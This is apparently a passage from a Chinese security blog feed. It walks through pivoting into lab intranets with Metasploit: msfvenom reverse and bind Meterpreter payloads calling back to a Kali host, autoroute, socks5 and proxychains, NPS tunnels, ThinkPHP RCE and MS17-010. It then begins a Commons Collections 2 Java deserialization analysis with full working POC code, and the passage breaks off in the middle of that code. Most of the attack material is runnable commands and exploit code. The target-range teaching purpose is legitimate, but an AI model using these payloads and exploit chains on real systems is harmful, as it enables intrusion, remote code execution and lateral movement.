title="MSF"></a>MSF</h1><p>首先我们通过windows7开放的Web服务先拿下Web服务器的权限，这里主要写的是代理的知识，拿Web权限就不在过多阐述。</p><p><img src="/assets/1-20220124092433-8t5icmk.png" alt="1.png"></p><p>拿到Web权限之后，我们可以利用msfvenom生成一个后门，然后利用Web权限进行上传。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.178.128 lport=4444 -f exe &gt;shell.exe</span><br></pre></td></tr></table></figure><p>上传之后在kali上配置监听，拿服务器权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler </span><br><span class="line">msf5 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; set lhost 192.168.178.128</span><br></pre></td></tr></table></figure><p><img src="/assets/2-20220124092512-y1bg402.png" alt="2.png"></p><p>拿到Web服务器权限之后，我们可以通过这个Web服务器的shell来做一些内网上的渗透，但是我如果想直接通过我们kali攻击机去访问到windwos server 2008我们该怎么去做呢。我们知道我们的kali是无法ping通windwos server 2008，因为windwos server 2008它是不出网的，想要访问到windwos server 2008这里就要借助一些代理知识来辅助我们了。</p><p>本篇我们先借助MSF来实现代理功能</p><p>在拿到meterpreter权限之后，我们可以使用如下命令来查看一下网络中的路由信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run get_local_subnets</span><br></pre></td></tr></table></figure><p><img src="/assets/3-20220124092537-06pyhkg.png" alt="3.png"></p><p>我们kali所属的网段是192.168.178.0的网段，这里还有一个192.168.52.0的网段，所以这时我们就可以利用MSF中的扫描模块对52网段进行一波扫描实现主机发现，这里我们根据上文环境搭建部分，已经知道内网中还存在一台192.168.52.138 IP的windwos server 2008。</p><p>那么我们可以在这里添加一条指向52网段的路由，如下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -s 192.168.52.0/255.255.255.0</span><br></pre></td></tr></table></figure><p><img src="/assets/4-20220124092553-78ugw43.png" alt="4.png"></p><p>然后使用如下命令查看session中的路由。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -p</span><br></pre></td></tr></table></figure><p><img src="/assets/5-20220124092651-4lrtx08.png" alt="5.png"></p><p>在session存在路由了之后，我们可以使用一个代理socks的代理模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; use auxiliary/server/socks5</span><br><span class="line">msf5 auxiliary(server/socks5) &gt; set srvhost 192.168.178.128  #本处设置IP为kali攻击机IP</span><br></pre></td></tr></table></figure><p><img src="/assets/6-20220124092716-klfjhem.png" alt="6.png"></p><p>配置好了socks代理，我们可以借助一款kali上自带的全局代理软件proxychains来连接socks代理</p><p>首先我们对proxychains代理软件进行配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/proxychains.conf</span><br></pre></td></tr></table></figure><p>在末尾添加socks代理的映射关系（且与在MSF上配置的相对应）</p><p><img src="/assets/7-20220124092735-v3b7w5u.png" alt="7.png"></p><p>配置好之后，我们就可以通过proxychains来访问到内网中的windwos server 2008这台服务器了。</p><p><img src="/assets/8-20220124092749-vityol5.png" alt="8.png"></p><p>如此，我们就还可以生成一个正向的木马，然后通过一些漏洞上传到windwos server 2008上，再利用proxychains来启动MSF配置监听，来达到利用kali接受到内网中windows server 2008这台服务器的shell。</p><h1 id="NPS代理攻击"><a href="#NPS代理攻击" class="headerlink" title="NPS代理攻击"></a>NPS代理攻击</h1><p>除了MSF之外还有许多现成的代理工具如Frp、NPS、EarthWorm、reGeorg等等，这些代理工具使用方法都大同小异，由于本人经常使用NPS，故下文主要演示一下NPS的使用。</p><p>NPS是一款轻量级、高性能、功能强大的内网穿透代理服务器，它几乎支持所有协议，其还支持内网http代理、内网socks5代理、p2p等等。NPS相比其他代理工具其具有简洁且功能强大的WEB管理界面，支持服务端、客户端同时控制，扩展功能强大。</p><p><strong>下载地址</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/fatedier/frp</span><br><span class="line">https://ehang-io.github.io/nps/#/   #官方使用文档</span><br></pre></td></tr></table></figure><p>这里存在对应版本的客户端和服务端，可以都下载下来。</p><p><img src="/assets/9-20220124093031-59tyk2x.png" alt="9.png"></p><p>首先我们通过windows7开放的Web服务先拿下Web服务器的权限，这里主要写的是代理的知识，拿Web权限就不在过多阐述。</p><p><img src="/assets/1-20220124092433-8t5icmk.png" alt="1.png"></p><p>拿到Web权限之后，我们可以利用msfvenom生成一个后门，然后利用Web权限进行上传。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.178.128 lport=4444 -f exe &gt;shell.exe</span><br></pre></td></tr></table></figure><p>上传之后在kali上配置监听，拿服务器权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler </span><br><span class="line">msf5 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; set lhost 192.168.178.128</span><br></pre></td></tr></table></figure><p><img src="/assets/2-20220124092512-y1bg402.png" alt="2.png"></p><p>然后我们可以把我们下载好的对应版本的NPS客户端上传到这台Web服务器上。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; upload /root/桌面/windows_386_client/ c:\\</span><br></pre></td></tr></table></figure><p><img src="/assets/3-20220124093556-titd9bq.png" alt="3.png"></p><p>上传好之后，我们可以在攻击机windows10上启动NPS服务端，首先以管理员权限启动cmd，然后执行如下命令进行NPS的初始化安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D:\tools\nps\windows_386_server&gt;nps install</span><br></pre></td></tr></table></figure><p><img src="/assets/4-20220124093607-qrmfkco.png" alt="4.png"></p><p>然后启动即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D:\tools\nps\windows_386_server&gt;nps.exe start</span><br></pre></td></tr></table></figure><p>启动好之后，我们可以输入本地IP+8080端口进行访问WEB客户端</p><p><img src="/assets/5-20220124093627-0vj5ugg.png" alt="5.png"></p><p>输入默认账号admin，密码123进入管理页面</p><p><img src="/assets/6-20220124093640-0yw4fcs.png" alt="6.png"></p><p>进入管理页面之后，我们可以新增一个客户端</p><p><img src="/assets/7-20220124093649-w5xg3sv.png" alt="7.png"></p><p>然后根据提示添加相关信息即可</p><p><img src="/assets/8-20220124093657-y1ooij6.png" alt="8.png"></p><p>添加好一个客户端之后，我们可以在windwos7那台Web服务器上用我们之前上传的NPS客户端软件进行连接，连接命令如下图</p><p><img src="/assets/9-20220124093704-u4hey15.png" alt="9.png"></p><p><img src="/assets/10-20220124093713-qm8ql6e.png" alt="10.png"></p><p>执行命令之后，我们就可以回到我们的WEB界面，可以看到一个客户端已经进行连接</p><p><img src="/assets/11-20220124093752-nhixiwk.png" alt="11.png"></p><p>连接成功之后，我们可以新增一个socks5的代理</p><p><img src="/assets/12-20220124093802-q3f65a8.png" alt="12.png"></p><p>配置好客户端id，和服务端端口等信息（id为上图中所创建的客户端id号）</p><p><img src="/assets/13-20220124093812-ulw2zz9.png" alt="13.png"></p><p>点击新增后，即可发现已经创建号socks5的代理</p><p><img src="/assets/14-20220124093820-j1ih9i7.png" alt="14.png"></p><p>那么接下来，我们可以通过这个socks5的代理，对内网windwos server 2008的服务器进行访问一下。</p><p>我们可以利用SwitchyOmega配置socks5代理对内网中的windwos server 2008的Web服务进行访问</p><p><img src="/assets/15-20220124093826-12ayys8.png" alt="15.png"></p><p>添加代理后可以对windwos server 2008的Web服务进行正常访问</p><p><img src="/assets/16-20220124093835-pw29iyj.png" alt="16.png"></p><p>当然我们还可以借助Proxifier这款软件做一个socks5的全局代理</p><p><img src="/assets/17-20220124093843-v9hgp0z.png" alt="17.png"></p><p><img src="/assets/18-20220124093853-yc51h7y.png" alt="18.png"></p><p>配置好之后，也可以对其进行访问</p><p><img src="/assets/19-20220124093900-02hj81f.png" alt="19.png"></p><p><img src="/assets/20-20220124093908-s3btckn.png" alt="20.png"></p><h1 id="多级代理"><a href="#多级代理" class="headerlink" title="多级代理"></a>多级代理</h1><p>在有些内网环境中，它的内网环境分为好几层，我们必须通过拿到一层内网中服务器的权限之后再通过这一内网中的服务器进一步访问二层内网中的其他服务器。在这种环境中，我们就需要多级代理突破层层内网，来实现在内网中漫游。</p><h2 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>本次实验环境借助一个CFS三层的靶机，靶机下载地址如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">【CFS三层靶机环境】百度网盘链接：</span><br><span class="line">链接: https://pan.baidu.com/s/1LJueA-X02K7HZXr8QsOmeg</span><br><span class="line">提取码: dkcp</span><br><span class="line">解压密码：teamssix.com</span><br></pre></td></tr></table></figure><p>网络拓扑图如下（子网掩码都为24位）</p><p><img src="/assets/1-20220124094046-nqqq7ab.png" alt="1.png"></p><p>在该网络拓扑中178网段模拟的是外网环境，239网段为第一层内网，154网段为第二层内网，每一个target靶机中都存放着一个flag，最终目的是要拿到所有目标靶机中的flag，当然我们这讨论的是代理知识，所以flag我们就忽略掉。</p><p>首先用nmap对178网段中存活主机做一个探测</p><p><img src="/assets/2-20220124094327-340ta5z.png" alt="2.png"></p><p>可以发现在178网段中存在一个142的地址，也就是centos7的地址，发现142可以再利用nmap对其进行一个系统扫描</p><p><img src="/assets/3-20220124094332-iem900e.png" alt="3.png"></p><p>其中开放这80端口，我们可以对他的80端口进行一个访问,最终是会发现存在一个Think PHP</p><p><img src="/assets/4-20220124094337-rr3sp6x.png" alt="4.png"></p><p>该版本存在一个RCE执行，这里利用工具进行一键get shell</p><p><img src="/assets/5-20220124094344-e6w28ys.png" alt="5.png"></p><p>然后蚁剑链接</p><p><img src="/assets/6-20220124094351-fp20pou.png" alt="6.png"></p><p>连接之后，我们利用msfvenom创建一个后门</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=192.168.178.128 lport=4444 -f elf &gt;shell.elf</span><br></pre></td></tr></table></figure><p>通过web shell上传到target 1服务器上，然后在kali上配置监听</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler </span><br><span class="line">msf5 exploit(multi/handler) &gt; set payload linux/x64/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; set lhost 192.168.178.128</span><br></pre></td></tr></table></figure><p>执行后门拿下target 1服务器权限</p><p><img src="/assets/7-20220124094357-sejgc0q.png" alt="7.png"></p><p>在拿到meterpreter权限之后，我们可以 run get_local_subnets 查看一下网络中的路由信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run get_local_subnets</span><br></pre></td></tr></table></figure><p><img src="/assets/8-20220124094406-ovf07fy.png" alt="8.png"></p><p>可以发现还存在239的网段，那我们先往session里面添加一条239网段的路由</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -s 192.168.239.0/24</span><br></pre></td></tr></table></figure><p><img src="/assets/9-20220124094413-s1sb3t3.png" alt="9.png"></p><p>然后使用 run autoroute -p 查看session中的路由是否添加成功。</p><p><img src="/assets/10-20220124094418-jp0kopi.png" alt="10.png"></p><p>发现已存在，接下来我们使用一个socks5代理模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; use auxiliary/server/socks5</span><br></pre></td></tr></table></figure><p>然后配置好ip，run启动</p><p><img src="/assets/11-20220124094427-8f7gm45.png" alt="11.png"></p><p>配置好了socks代理，我们可以借助一款kali上自带的全局代理软件proxychains来连接socks代理</p><p>首先我们对proxychains代理软件进行配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/proxychains.conf</span><br></pre></td></tr></table></figure><p>在末尾添加socks代理的映射关系（且与在MSF上配置的相对应）</p><p><img src="/assets/7-20220124092735-v3b7w5u.png" alt="12.png"></p><p>配置好后，我们利用代理软件来启动nmap对239网段中存活主机做一个探测</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -sT -p80 192.168.239.1/24   #正常不能添加-p参数，这里为上帝视角知道239网段中129主机启动着一个web服务，目的是让扫描快一点</span><br></pre></td></tr></table></figure><p><img src="/assets/13-20220124094445-xtbyt8n.png" alt="13.png"></p><p>扫描到239网段中的129地址，接下来和之前一样对其进行一个系统的扫描，访问web服务，web服务中存在sql注入然后拿下web权限（target2拿web权限的操作省略），拿下权限通过msfvenom创建后门进行上传，但是此处的后门要生成一个正向的后门。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/bind_tcp lport=1234 -f elf &gt;shell2.elf</span><br></pre></td></tr></table></figure><p>此处为什么要生成一个正向的木马呢，我们在这分析一下，这里再放下拓扑图，方便理解。</p><p><img src="/assets/1-20220124094046-nqqq7ab.png" alt="14.png"></p><p>我们拿下了target2的web权限，加入这是我们上传的是反向的木马，那么target2就要去寻找我们kali的路由，但是target2主机中没有kali的路由，那么就会导致我们的反弹shell失败，之后我们再来看看正向的。</p><p>我们生成了一个正向的木马，我们的kali攻击机就会去主动寻找target2的服务器，这个时候我们应为做了一个socks5的代理，我们的流量会通过kali的ip的1080端口代理给target1，然后target1中是存在239网段中的路由的，所以我们可以正常进行连接。</p><p>理解好之后，之后的操作就很简单了，通过我们通过sql注入拿到的web权限上传木马，然后在kali上利用proxychains启动msfconsole</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@root:~/桌面# proxychains msfconsole</span><br></pre></td></tr></table></figure><p>然后配置监听</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler </span><br><span class="line">msf5 exploit(multi/handler) &gt; set payload linux/x64/meterpreter/bind_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; set lport 1234</span><br><span class="line">msf5 exploit(multi/handler) &gt; set rhost 192.168.239.129</span><br></pre></td></tr></table></figure><p> 执行木马即可拿下第二层主机服务器权限</p><p><img src="/assets/15-20220124094501-ysyjb8v.png" alt="15.png"></p><p>拿下第二层之后，之后操作大同小异，添加路由，探测第三层存活主机，发现192.168.154.129的ip，然后该台机器存在永恒之蓝漏洞，利用ms17-010拿下第三层权限</p><p>msf5 exploit(multi&#x2F;handler) &gt; use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_psexec</p><p>msf5 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp</p><p><img src="/assets/16-20220124094509-e9m91us.png" alt="16.png"></p><p>至此三个靶机中的flag都可以找到。</p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网安全 </tag>
            
            <tag> 渗透代理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CommonCollections2反序列化链分析</title>
      <link href="/2023/05/06/CommonCollections2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/"/>
      <url>/2023/05/06/CommonCollections2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>CC2链使用了apache commons collections组件4.0版构造，且其借助了动态字节码去构造POC，具体动态字节码<a href="../../05/%E5%8A%A8%E6%80%81%E5%AD%97%E8%8A%82%E7%A0%81/">参考</a>。</p><h1 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h1><blockquote><p>jdk1.7.80<br>Commons Collections 4.0<br>存在javassist依赖</p></blockquote><h1 id="序列化链分析"><a href="#序列化链分析" class="headerlink" title="序列化链分析"></a>序列化链分析</h1><p>CC2.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//获取Exploit恶意类并转换为字节码</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.getCtClass(<span class="string">&quot;ysoserial.Exploit&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过反射获取TemplatesImpl类</span></span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">TemplatesImpl_instance</span> <span class="operator">=</span> aClass.newInstance();</span><br><span class="line">  </span><br><span class="line">        <span class="comment">//将恶意类的字节码设置给_bytecodes属性</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> aClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(TemplatesImpl_instance , <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">  </span><br><span class="line">        <span class="comment">//设置属性_name为恶意类名</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> aClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(TemplatesImpl_instance , <span class="string">&quot;TestTemplatesImpl&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//构造利用链</span></span><br><span class="line">        InvokerTransformer transformer=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformer_comparator</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer);</span><br><span class="line">  </span><br><span class="line">        <span class="comment">//触发漏洞</span></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置comparator属性</span></span><br><span class="line">        Field field=queue.getClass().getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(queue,transformer_comparator);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置queue属性</span></span><br><span class="line">        field=queue.getClass().getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//队列至少需要2个元素</span></span><br><span class="line">        Object[] objects = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;TemplatesImpl_instance , TemplatesImpl_instance&#125;;</span><br><span class="line">        field.set(queue,objects);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化 ---&gt; 反序列化</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Exploit.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exploit</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Exploit</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span></span><br><span class="line">        <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行CC2.java成功执行命令</p><p><img src="/assets/image-20230505182336-va124jl.png" alt="image.png"></p><p>那么来看看CC2链是怎么构造的</p><p>在CC2.java的15-19行内</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取Exploit恶意类并转换为字节码</span></span><br><span class="line"><span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"><span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.getCtClass(<span class="string">&quot;ysoserial.Exploit&quot;</span>);</span><br><span class="line"><span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br></pre></td></tr></table></figure><p>这里先通过getCtClass去获取到Exploit也就是我们定义的恶意类，然后通过toBytecode去把对象转换为字节码文件</p><p>紧接的20-22行就是通过反射获取TemplatesImpl类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//通过反射获取TemplatesImpl类</span></span><br><span class="line">Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">TemplatesImpl_instance</span> <span class="operator">=</span> aClass.newInstance();</span><br></pre></td></tr></table></figure><p>然后24-32行分别通过反射去操作了一个bytecodes属性和一个name属性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//将恶意类的字节码设置给_bytecodes属性</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> aClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">bytecodes.set(TemplatesImpl_instance , <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">  </span><br><span class="line"><span class="comment">//设置属性_name为恶意类名</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> aClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">name.setAccessible(<span 